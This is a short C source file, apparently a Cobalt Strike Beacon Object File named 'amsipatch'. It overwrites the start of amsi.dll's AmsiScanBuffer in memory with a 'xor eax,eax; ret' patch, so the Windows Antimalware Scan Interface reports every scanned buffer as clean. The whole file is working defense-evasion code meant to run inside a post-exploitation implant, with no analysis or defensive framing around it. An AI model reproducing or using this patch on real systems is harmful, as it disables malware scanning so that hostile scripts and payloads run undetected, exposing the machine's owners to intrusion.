/*
 * amsipatch - patch amsi.dll!AmsiScanBuffer to return S_OK.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    HMODULE amsi;
    FARPROC fn;
    DWORD old = 0;
    unsigned char patch[3] = { 0x33, 0xC0, 0xC3 }; /* xor eax,eax ; ret */
    (void)args; (void)alen;

    amsi = KERNEL32$LoadLibraryA("amsi.dll");
    if (!amsi) {
        BeaconPrintf(CALLBACK_ERROR, "amsi.dll not loaded and LoadLibrary failed\n");
        return;
    }

    fn = KERNEL32$GetProcAddress(amsi, "AmsiScanBuffer");
    if (!fn) {
        BeaconPrintf(CALLBACK_ERROR, "AmsiScanBuffer not found\n");
        return;
    }

    if (!KERNEL32$VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualProtect failed: %lu\n", (unsigned long)KERNEL32$GetLastError());
        return;
    }

    bof_memcpy(fn, patch, sizeof(patch));
    KERNEL32$VirtualProtect(fn, sizeof(patch), old, &old);

    BeaconPrintf(CALLBACK_OUTPUT, "Patched AmsiScanBuffer at %p\n", fn);
}
